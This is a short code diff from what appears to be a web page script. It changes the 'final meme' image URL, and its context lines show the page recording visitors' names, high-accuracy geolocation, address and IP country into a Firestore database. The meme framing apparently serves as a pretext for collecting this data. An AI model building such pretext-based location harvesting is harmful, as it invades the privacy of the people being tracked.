@@ -14,7 +14,7 @@ const db = firebase.firestore();
 
 // --- Parámetros ---
 const ALLOWED_COUNTRIES = new Set(["gt","ar","pe"]);
-const FINAL_IMAGE_URL = "https://placekitten.com/1200/800"; // cámbiala por tu meme final
+const FINAL_IMAGE_URL = "https://github.com/OrlandoRodas303/for-you-/blob/main/images.jpeg?raw=true"; // cámbiala por tu meme final
 
 // --- Utilidades ---
 const $ = s => document.querySelector(s);
@@ -68,4 +68,5 @@ $("#btn-continuar").addEventListener("click",()=>{
       saveAccess({nombre,apellido,lat,lon,accuracy,address,countryCode,ipCountryCode:ipInfo?.ipCountryCode||null,allowed:true});
     }catch(e){setStatus("Error al procesar ubicación.","err");console.error(e);}
   },err=>setStatus("Permiso denegado: "+err.message,"err"),{enableHighAccuracy:true,timeout:12000,maximumAge:0});
+
 });
